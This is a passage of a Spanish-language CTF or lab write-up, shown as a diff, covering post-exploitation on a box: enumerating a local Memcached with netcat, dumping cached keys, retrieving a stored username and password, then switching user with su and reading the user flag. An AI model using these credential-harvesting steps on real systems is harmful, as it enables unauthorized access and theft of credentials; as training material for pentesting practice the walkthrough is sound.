@@ -259,7 +259,112 @@ Enunciado :
       tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
       tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -   ----> ESTE ES EL QUE NOS INTERESA ESTA CORRIENDO --> Memcached            
       tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
-      tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -        
+      tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
+
+  Que es Mencached? [+] https://aws.amazon.com/es/memcached/
+
+- Atacamos Mencached en busca de informacion.
+
+  Info: https://book.hacktricks.xyz/v/es/network-services-pentesting/11211-memcache
+
+  1) Nos conectamos al servicio con netcat.
+
+          www-data@osboxes:/home$ nc 127.0.0.1 11211 -v
+          nc 127.0.0.1 11211 -v
+          Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
+
+  2) Obtenemos el numero de slabs(placas o losas) y demas informacion que hay disponible, tenemos 1 slab diponible.
+
+          stats slabs
+          STAT 1:chunk_size 80
+          STAT 1:chunks_per_page 13107
+          STAT 1:total_pages 1
+          STAT 1:total_chunks 13107
+          STAT 1:used_chunks 5
+          STAT 1:free_chunks 13102
+          STAT 1:free_chunks_end 0
+          STAT 1:mem_requested 321
+          STAT 1:get_hits 0
+          STAT 1:cmd_set 75
+          STAT 1:delete_hits 0
+          STAT 1:incr_hits 0
+          STAT 1:decr_hits 0
+          STAT 1:cas_hits 0
+          STAT 1:cas_badval 0
+          STAT 1:touch_hits 0
+          STAT active_slabs 1
+          STAT total_malloced 1048560
+          END
+
+  3) Obtenemos los items del slab disponible.
+
+          stats items
+          STAT items:1:number 5  ---> Indica que hay 5 items almacenados en el "slab" con ID 1.
+          STAT items:1:age 9675
+          STAT items:1:evicted 0
+          STAT items:1:evicted_nonzero 0
+          STAT items:1:evicted_time 0
+          STAT items:1:outofmemory 0
+          STAT items:1:tailrepairs 0
+          STAT items:1:reclaimed 0
+          STAT items:1:expired_unfetched 0
+          STAT items:1:evicted_unfetched 0
+          STAT items:1:crawler_reclaimed 0
+          STAT items:1:crawler_items_checked 0
+          STAT items:1:lrutail_reflocked 0
+
+  4) Listamos las claves y su información asociada, indicando <slab_id> <number_of_items>
+
+          stats cachedump 1 5
+          ITEM username [4 b; 1700665410 s]
+          ITEM id [4 b; 1700665410 s]
+          ITEM email [14 b; 1700665410 s]
+          ITEM salary [8 b; 1700665410 s]
+          ITEM password [15 b; 1700665410 s]
+          END
+     
+      Como vemos tiene almacenado la ficha de identificacion de un posible usuario.
+
+  6) Obtenemos el valor de los items, en este caso nos interesan username y password
+     
+          get username
+          get username
+          VALUE username 0 4
+          Orka
+          END
+     
+          get password
+          get password
+          VALUE password 0 15
+          OrkAiSC00L24/7$
+
+    Mencache almacenaba en este caso la ficha de identificacion del usuario Orka ---> Orka:OrkAiSC00L24/7$
+
+
+- Escalada horizontal, leemos flag de usuario.
+
+      www-data@osboxes:/home$ su Orka
+      su Orka
+      Password: OrkAiSC00L24/7$
+      
+      Orka@osboxes:/home$ whoami              whoami
+      whoami
+      Orka
+
+      Orka@osboxes:~$ cat user.txt    cat user.txt
+      cat user.txt
+      1a26a6d51c0172400ad----7608dec6
+
+
+## Escalada Vertical de privilegios  Orka to root
+
+
+
+
+
+     
+
+    
         
          
            
